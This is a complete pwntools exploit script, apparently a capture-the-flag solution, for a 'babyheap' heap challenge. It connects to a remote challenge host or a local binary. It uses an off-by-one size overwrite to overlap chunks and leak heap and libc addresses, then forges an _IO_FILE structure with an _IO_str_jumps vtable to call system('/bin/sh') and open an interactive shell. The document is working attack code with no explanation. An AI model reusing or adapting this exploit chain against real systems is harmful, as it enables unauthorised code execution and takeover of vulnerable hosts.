#!/usr/bin/env python

from pwn import *

def allocate(size):
    s.sendlineafter('Command: ', '1')
    s.sendlineafter('Size: ', str(size))

def update(index,size,content):
    s.sendlineafter('Command: ', '2')
    s.sendlineafter('Index: ', str(index))
    s.sendlineafter('Size: ', str(size))
    s.sendlineafter('Content: ', content)

def delete(index):
    s.sendlineafter('Command: ', '3')
    s.sendlineafter('Index: ', str(index))

def view(index):
    s.sendlineafter('Command: ', '4')
    s.sendlineafter('Index: ', str(index))
    s.recvuntil('Chunk[%d]: ' % index)
    return s.recvline(False)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./babyheap')
        # unsorted_bins = 0x3c4b78
        unsorted_bin = 0x3c1b58
        # unsorted_bin = 0x3bc7b8
        _IO_str_jumps = 0x3be4c0
        # _IO_str_jumps = 0x3bb740
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        s = remote('202.120.7.204', 127)
        unsorted_bin = 0x399b58
        _IO_file_jumps = 0x396440
        _IO_str_jumps = _IO_file_jumps + 0xc0
        libc = ELF('./libc-2.24.so')

    allocate(0x18)
    allocate(0x18)
    allocate(0x38)
    allocate(0x28)
    allocate(0x28)
    allocate(0x38)
    allocate(0x18)
    allocate(0x38)
    delete(7)
    update(0,0x19,'A'*0x18 + '\x61')
    delete(1)
    allocate(0x58)
    update(1,0x19,'A'*0x18 + '\x41')
    delete(2)
    heap_base = u64(view(1)[0x20:0x28]) - 0x140
    log.info('heap base: %#x' % heap_base)
    allocate(0x38)
    update(1,0x19,'A'*0x18 + '\xe1')
    delete(2)
    libc_base = u64(view(1)[0x20:0x28]) - unsorted_bin
    log.info('libc base: %#x' % libc_base)

    '''
    _IO_FILE offset: 0x40
     + 0x0 = 0
     + 0x20 = 0
     + 0x28 = 0x7fffffffffffffff
     + 0x38 = 0
     + 0x40 = (binsh - 100) / 2
     + 0xa0 = heap_base
     + 0xd8 = _IO_str_jumps
     + 0xe0 = system
    '''

    update(0,0x18,p64(0) + p64(1) + '/bin/sh\0')
    update(1,0x58,'A' * 0x10 + p64(0) + p64(0x61) + 'A' * 8 + p64(libc_base + libc.symbols['_IO_list_all'] - 0x10) + p64(0) + p64(0x7fffffffffffffff) + 'A' * 8 + p64(0) + p64((heap_base + 0x20 - 100) // 2))
    update(4,0x28,'A' * 0x20 + p64(heap_base))
    update(5,0x38,'A' * 0x28 + p64(libc_base + _IO_str_jumps) + p64(libc_base + libc.symbols['system']))
    allocate(0x48)

    s.interactive()
